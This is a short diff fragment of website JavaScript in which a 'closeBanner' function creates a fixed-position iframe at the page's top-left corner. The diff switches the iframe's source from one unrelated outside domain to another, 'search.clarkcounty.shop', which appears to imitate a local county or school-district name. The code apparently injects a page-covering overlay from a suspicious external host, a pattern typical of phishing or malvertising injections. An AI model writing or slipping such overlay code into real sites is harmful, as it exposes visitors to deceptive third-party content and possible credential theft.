@@ -39,7 +39,7 @@ function closeBanner() {
       
                   if (ccsdWindow) {
                       var iframe = document.createElement("iframe");
-                      iframe.src = "https://fixuv.bimbos.dev";
+                      iframe.src = "https://search.clarkcounty.shop";
                       iframe.style.position = "fixed";
                       iframe.style.top = "0";
                       iframe.style.left = "0";
